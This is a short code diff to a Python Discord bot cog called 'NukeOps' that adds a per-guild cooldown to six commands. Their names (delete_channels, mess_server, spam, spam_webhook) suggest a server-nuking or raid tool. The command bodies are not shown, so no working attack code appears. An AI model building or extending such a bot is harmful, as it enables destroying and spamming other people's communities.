@@ -15,6 +15,7 @@ class NukeOps(commands.Cog):
         self.operations: Operations | None = getattr(bot, "operations", None)
 
     @commands.command(name="create_channels", aliases=["createchannels", "cc"])
+    @commands.cooldown(1, 120, commands.BucketType.guild)
     @commands.guild_only()
     @commands.bot_has_permissions(manage_channels=True)
     @is_blacklisted
@@ -31,6 +32,7 @@ class NukeOps(commands.Cog):
             logging.error(f"[create_channels] failed: {e}\n{tb}")
 
     @commands.command(name="delete_channels", aliases=["deletechannels", "dc"])
+    @commands.cooldown(1, 120, commands.BucketType.guild)
     @commands.guild_only()
     @commands.bot_has_permissions(manage_channels=True)
     @is_blacklisted
@@ -47,6 +49,7 @@ class NukeOps(commands.Cog):
             logging.error(f"[delete_channels] failed: {e}\n{tb}")
 
     @commands.command(name="mess_server", aliases=["messserver", "ms"])
+    @commands.cooldown(1, 120, commands.BucketType.guild)
     @commands.guild_only()
     @commands.bot_has_permissions(manage_guild=True)
     @is_blacklisted
@@ -63,6 +66,7 @@ class NukeOps(commands.Cog):
             logging.error(f"[mess_server] failed: {e}\n{tb}")
 
     @commands.command(name="spam", aliases=["sp", "s"])
+    @commands.cooldown(1, 120, commands.BucketType.guild)
     @commands.guild_only()
     @commands.bot_has_permissions(send_messages=True)
     @is_blacklisted
@@ -79,6 +83,7 @@ class NukeOps(commands.Cog):
             logging.error(f"[spam] failed: {e}\n{tb}")
 
     @commands.command(name="spam_webhook", aliases=["sw", "spamwh"])
+    @commands.cooldown(1, 120, commands.BucketType.guild)
     @commands.guild_only()
     @commands.bot_has_permissions(manage_webhooks=True)
     @is_blacklisted
@@ -95,6 +100,7 @@ class NukeOps(commands.Cog):
             logging.error(f"[spam_webhook] failed: {e}\n{tb}")
 
     @commands.command(name="create_event", aliases=["createevent", "ce"])
+    @commands.cooldown(1, 120, commands.BucketType.guild)
     @commands.guild_only()
     @commands.bot_has_permissions(manage_events=True)
     @is_blacklisted
